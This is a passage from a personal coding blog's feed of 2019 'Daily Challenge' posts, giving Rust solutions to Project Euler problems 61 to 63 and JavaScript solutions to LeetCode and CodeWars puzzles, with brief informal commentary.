quotes from Jaden Smith, but they are not capitalized in the same way he originally typed them.</p><p>Example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Not Jaden-Cased: &quot;How can mirrors be real if our eyes aren&apos;t real&quot;</span><br><span class="line">Jaden-Cased:     &quot;How Can Mirrors Be Real If Our Eyes Aren&apos;t Real&quot;</span><br></pre></td></tr></table></figure><p>Note that the <strong>Java version</strong> expects a return value of null for an empty string or null</p></li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.toJadenCase = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.split(<span class="string">" "</span>).map(<span class="function">(<span class="params">[a, ...i]</span>) =&gt;</span> [a.toUpperCase(), ...i].join(<span class="string">""</span>)).join(<span class="string">" "</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> CodeWars </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-21 Daily Challenge</title>
      <link href="/2019-02-21-Daily-Challenge/"/>
      <url>/2019-02-21-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Powerful digit counts</em> in <em>Rust</em> and <em>Partition to K Equal Sum Subsets</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Powerful-digit-counts"><a href="#Powerful-digit-counts" class="headerlink" title="Powerful digit counts"></a>Powerful digit counts</h3><h3 id="Problem-63"><a href="#Problem-63" class="headerlink" title="Problem 63"></a>Problem 63</h3><p>The 5-digit number, 16807=75, is also a fifth power. Similarly, the 9-digit number, 134217728=89, is a ninth power.</p><p>How many <em>n</em>-digit positive integers exist which are also an <em>n</em>th power?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Knowledge behind this problem is easy to understand but not easy to illustrate, so check my code~</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1u128</span>..<span class="number">10u128</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> stop = <span class="literal">false</span>; <span class="comment">// Don't stop!</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> exp: <span class="built_in">u32</span> = <span class="number">1</span>; </span><br><span class="line">        <span class="keyword">while</span> !stop &#123;</span><br><span class="line">            <span class="keyword">let</span> len = i.pow(exp).to_string().len();</span><br><span class="line">            <span class="keyword">if</span> len != exp <span class="keyword">as</span> <span class="built_in">usize</span> &#123;</span><br><span class="line">                stop = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            exp += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="698-Partition-to-K-Equal-Sum-Subsets"><a href="#698-Partition-to-K-Equal-Sum-Subsets" class="headerlink" title="698. Partition to K Equal Sum Subsets"></a>698. Partition to K Equal Sum Subsets</h3><p>Given an array of integers <code>nums</code> and a positive integer <code>k</code>, find whether it&#39;s possible to divide this array into <code>k</code> non-empty subsets whose sums are all equal.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4, 3, 2, 3, 5, 2, 1], k = 4</span><br><span class="line">Output: True</span><br><span class="line">Explanation: It&apos;s possible to divide it into 4 subsets (5), (1, 4), (2,3), (2,3) with equal sums.</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li><code>1 &lt;= k &lt;= len(nums) &lt;= 16</code>.</li><li><code>0 &lt; nums[i] &lt; 10000</code>.</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>JS&#39;s sort is just like shit.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; k</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> canPartitionKSubsets = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) sum+=nums[i];</span><br><span class="line">  <span class="keyword">let</span> part = sum/k;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) <span class="keyword">if</span> (nums[i] &gt; part) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (sum % k !== <span class="number">0</span> || nums.length &lt; k ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">let</span> used = <span class="built_in">Array</span>.from(&#123;<span class="attr">length</span>:nums.length&#125;, x=&gt;<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">let</span> left = nums.length;</span><br><span class="line">  <span class="keyword">return</span> (<span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">target, start</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left === <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (target === <span class="number">0</span>) <span class="keyword">return</span> dfs(part, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = start; i &lt; nums.length; ++i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!used[i] &amp;&amp; nums[i] &lt;= target) &#123;</span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        left -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (dfs(target - nums[i], i + <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">        left += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;)(part, <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(canPartitionKSubsets([18,20,39,73,96,99,101,111,114,190,207,295,471,649,700,1037], 4));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-20 Daily Challenge</title>
      <link href="/2019-02-20-Daily-Challenge/"/>
      <url>/2019-02-20-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Cubic permutations</em> in <em>Rust</em> and <em>Lemonade Change</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Cubic-permutations"><a href="#Cubic-permutations" class="headerlink" title="Cubic permutations"></a>Cubic permutations</h3><h3 id="Problem-62"><a href="#Problem-62" class="headerlink" title="Problem 62"></a>Problem 62</h3><p>The cube, 41063625 ($345^3$), can be permuted to produce two other cubes: 56623104 ($384^3$) and 66430125 ($405^3$). In fact, 41063625 is the smallest cube which has exactly three permutations of its digits which are also cube.</p><p>Find the smallest cube for which exactly five permutations of its digits are cube.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I used a simple function to mapping number to another number to determine if they are of same digits.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> map: HashMap&lt;<span class="built_in">u64</span>, <span class="built_in">usize</span>&gt; = HashMap::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> first_num: HashMap&lt;<span class="built_in">u64</span>, <span class="built_in">u64</span>&gt; = HashMap::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> !found &#123;</span><br><span class="line">        <span class="keyword">let</span> cube = cur * cur * cur;</span><br><span class="line">        <span class="keyword">let</span> tmp = special_f(cube);</span><br><span class="line">        <span class="keyword">let</span> it = map.entry(tmp).or_insert(<span class="number">0</span>);</span><br><span class="line">        *it += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">match</span> map.get(&amp;tmp) &#123;</span><br><span class="line">            <span class="literal">Some</span>(n) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> *n == <span class="number">1</span> &#123;</span><br><span class="line">                    first_num.insert(tmp, cube);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> *n == <span class="number">5</span> &#123;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    ans = *first_num.get(&amp;tmp).unwrap();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">None</span> =&gt; (),</span><br><span class="line">        &#125;</span><br><span class="line">        cur += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">special_f</span></span>(<span class="keyword">mut</span> n: <span class="built_in">u64</span>) -&gt; <span class="built_in">u64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> arr: [<span class="built_in">u64</span>; <span class="number">10</span>] = [<span class="number">0</span>; <span class="number">10</span>];</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = (n % <span class="number">10</span>) <span class="keyword">as</span> <span class="built_in">usize</span>;</span><br><span class="line">        arr[tmp] += <span class="number">1</span>;</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> arr[i] &gt; <span class="number">0</span> &#123;</span><br><span class="line">            tmp *= <span class="number">10</span>;</span><br><span class="line">            tmp += i;</span><br><span class="line">            arr[i] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> arr[<span class="number">0</span>] &gt; <span class="number">0</span> &#123;</span><br><span class="line">        tmp *= <span class="number">10</span>;</span><br><span class="line">        arr[<span class="number">0</span>] -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp <span class="keyword">as</span> <span class="built_in">u64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="860-Lemonade-Change"><a href="#860-Lemonade-Change" class="headerlink" title="860. Lemonade Change"></a>860. Lemonade Change</h3><p>At a lemonade stand, each lemonade costs <code>$5</code>. </p><p>Customers are standing in a queue to buy from you, and order one at a time (in the order specified by <code>bills</code>).</p><p>Each customer will only buy one lemonade and pay with either a <code>$5</code>, <code>$10</code>, or <code>$20</code> bill.  You must provide the correct change to each customer, so that the net transaction is that the customer pays $5.</p><p>Note that you don&#39;t have any change in hand at first.</p><p>Return <code>true</code> if and only if you can provide every customer with correct change.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [5,5,5,10,20]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">From the first 3 customers, we collect three $5 bills in order.</span><br><span class="line">From the fourth customer, we collect a $10 bill and give back a $5.</span><br><span class="line">From the fifth customer, we give a $10 bill and a $5 bill.</span><br><span class="line">Since all customers got correct change, we output true.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [5,5,10]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [10,10]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: [5,5,10,10,20]</span><br><span class="line">Output: false</span><br><span class="line">Explanation: </span><br><span class="line">From the first two customers in order, we collect two $5 bills.</span><br><span class="line">For the next two customers in order, we collect a $10 bill and give back a $5 bill.</span><br><span class="line">For the last customer, we can&apos;t give change of $15 back because we only have two $10 bills.</span><br><span class="line">Since not every customer received correct change, the answer is false.</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li><code>0 &lt;= bills.length &lt;= 10000</code></li><li><code>bills[i]</code> will be either <code>5</code>, <code>10</code>, or <code>20</code>.</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; bills</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> lemonadeChange = <span class="function"><span class="keyword">function</span>(<span class="params">bills</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> five = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> ten = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> bill <span class="keyword">of</span> bills) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bill === <span class="number">5</span>) &#123;</span><br><span class="line">      five += <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bill === <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (five === <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      five -= <span class="number">1</span>;</span><br><span class="line">      ten += <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ten === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (five &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        five -= <span class="number">3</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (five === <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        five -= <span class="number">1</span>;</span><br><span class="line">        ten -= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-19 Daily Challenge</title>
      <link href="/2019-02-19-Daily-Challenge/"/>
      <url>/2019-02-19-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Cyclical figurate numbers</em> in <em>Rust</em> and <em>Binary Tree Cameras</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Cyclical-figurate-numbers"><a href="#Cyclical-figurate-numbers" class="headerlink" title="Cyclical figurate numbers"></a>Cyclical figurate numbers</h3><h3 id="Problem-61"><a href="#Problem-61" class="headerlink" title="Problem 61"></a>Problem 61</h3><p>Triangle, square, pentagonal, hexagonal, heptagonal, and octagonal numbers are all figurate (polygonal) numbers and are generated by the following formulae:<br>|type|formula|numbers|<br>| ---------- | -------------------- | --------------------- |<br>| Triangle         | P3,<em>n</em>=<em>n</em>(<em>n</em>+1)/2        | 1, 3, 6, 10, 15, ...  |<br>| Square           | P4,<em>n</em>=<em>n</em>2                | 1, 4, 9, 16, 25, ...  |<br>| Pentagonal       | P5,<em>n</em>=<em>n</em>(3<em>n</em>−1)/2       | 1, 5, 12, 22, 35, ... |<br>| Hexagonal        | P6,<em>n</em>=<em>n</em>(2<em>n</em>−1)         | 1, 6, 15, 28, 45, ... |<br>| Heptagonal       | P7,<em>n</em>=<em>n</em>(5<em>n</em>−3)/2       | 1, 7, 18, 34, 55, ... |<br>| Octagonal        | P8,<em>n</em>=<em>n</em>(3<em>n</em>−2)         | 1, 8, 21, 40, 65, ... |</p><p>The ordered set of three 4-digit numbers: 8128, 2882, 8281, has three interesting properties.</p><ol><li>The set is cyclic, in that the last two digits of each number is the first two digits of the next number (including the last number with the first).</li><li>Each polygonal type: triangle (P3,127=8128), square (P4,91=8281), and pentagonal (P5,44=2882), is represented by a different number in the set.</li><li>This is the only set of 4-digit numbers with this property.</li></ol><p>Find the sum of the only ordered set of six cyclic 4-digit numbers for which each polygonal type: triangle, square, pentagonal, hexagonal, heptagonal, and octagonal, is represented by a different number in the set.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>DFS is ok.</p><p>BTW, before I wrote the right code, I wrote some shit.</p><img src="/2019-02-19-Daily-Challenge/shit.png" title="shit"><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num: HashMap&lt;<span class="built_in">i32</span>, <span class="built_in">u8</span>&gt; = HashMap::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: [<span class="built_in">i32</span>; <span class="number">6</span>] = [<span class="number">0</span>; <span class="number">6</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> t = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = t * (t + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; <span class="number">9999</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, tmp, <span class="number">1</span>);</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, t*t, <span class="number">1</span>&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, t*(<span class="number">3</span>*t-<span class="number">1</span>)/<span class="number">2</span>, <span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, t*(<span class="number">2</span>*t-<span class="number">1</span>), <span class="number">1</span>&lt;&lt;<span class="number">3</span>);</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, t*(<span class="number">5</span>*t-<span class="number">3</span>)/<span class="number">2</span>, <span class="number">1</span>&lt;&lt;<span class="number">4</span>);</span><br><span class="line">        special_insert(&amp;<span class="keyword">mut</span> num, t*(<span class="number">3</span>*t-<span class="number">2</span>), <span class="number">1</span>&lt;&lt;<span class="number">5</span>);</span><br><span class="line">        t += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (n, bitmask) <span class="keyword">in</span> &amp;num &#123;</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">100</span> &lt; <span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[<span class="number">0</span>] = *n;</span><br><span class="line">        <span class="keyword">if</span> dfs(*n, *bitmask, <span class="number">1</span>, &amp;num, &amp;<span class="keyword">mut</span> ans) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;:?&#125;"</span>, ans);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Sum of it is &#123;&#125;"</span>, ans.iter().fold(<span class="number">0</span>, |a, &amp;b| a + b));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">special_insert</span></span>(map: &amp;<span class="keyword">mut</span> HashMap&lt;<span class="built_in">i32</span>, <span class="built_in">u8</span>&gt;, n: <span class="built_in">i32</span>, bitmask: <span class="built_in">u8</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">1000</span> || n &gt; <span class="number">9999</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> map.contains_key(&amp;n) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = map.get(&amp;n).unwrap();</span><br><span class="line">        map.insert(n, tmp | bitmask);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        map.insert(n, bitmask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">dfs</span></span>(cur: <span class="built_in">i32</span>, bitmask: <span class="built_in">u8</span>, size: <span class="built_in">usize</span>, map: &amp;HashMap&lt;<span class="built_in">i32</span>, <span class="built_in">u8</span>&gt;, <span class="keyword">mut</span> ans: &amp;<span class="keyword">mut</span> [<span class="built_in">i32</span>]) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">6</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>] / <span class="number">100</span> == ans[<span class="number">5</span>] % <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> tmp = cur % 